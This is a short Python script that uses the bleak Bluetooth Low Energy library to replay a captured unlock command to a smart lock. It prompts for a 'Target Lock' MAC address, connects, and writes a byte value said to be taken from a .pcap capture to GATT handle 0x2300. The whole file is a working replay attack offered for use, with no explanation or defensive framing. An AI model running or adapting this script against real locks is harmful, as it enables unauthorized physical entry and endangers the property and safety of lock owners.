import asyncio
from bleak import BleakClient

# Terminal color codes for colored output
G = "\033[32m"
Y = "\033[33m"
R = "\033[31m"
RES = "\033[0m"

# Prompt user to enter MAC address (use default if none entered)
device = input("Enter Target Lock MAC address [Default: 11:22:33:44:55:66]: ")
if not device:
    device = "11:22:33:44:55:66"

# UUID and value extracted from original .pcap file (handle 0x2300)
uuid_unlock = "00002300-0000-1000-8000-00805f9b34fb"
unlock_value = bytes.fromhex("2a14")  # Example unlock payload from .pcap

async def main():
    print(f"{Y}[-]{RES} Connecting to {device}...")
    async with BleakClient(device) as client:
        if not client.is_connected:
            print(f"{R}[!] Failed to connect to {device}{RES}")
            return

        print(f"{G}[+]{RES} Connected to {device}")

        # Send unlock command to the device
        print(f"{Y}[-]{RES} Sending unlock command to {uuid_unlock}...")
        await client.write_gatt_char(uuid_unlock, unlock_value, response=True)
        print(f"{G}[+]{RES} Unlock command sent!")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"{R}[!] Error: {e}{RES}")
